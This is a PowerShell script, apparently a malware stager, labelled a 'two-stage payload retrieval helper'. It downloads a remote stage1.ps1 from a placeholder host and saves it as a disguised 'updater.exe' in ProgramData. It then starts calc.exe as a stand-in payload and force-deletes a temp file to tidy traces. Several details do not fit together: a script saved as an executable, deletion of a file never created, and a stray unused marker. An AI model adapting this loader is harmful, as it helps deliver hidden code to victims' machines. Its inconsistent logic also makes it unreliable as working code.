<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://contoso.com/stage1.ps1',
    [string]$Stage2Path = 'C:\ProgramData\updater.exe',
    [int]$RequestTimeout = 198
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$TransferResult = Invoke-Stage1Download -SourceUrl $TargetUrl -DestinationPath $Stage2Path -TimeoutSec $RequestTimeout
if ($TransferResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$StageMarker = "stage-8"
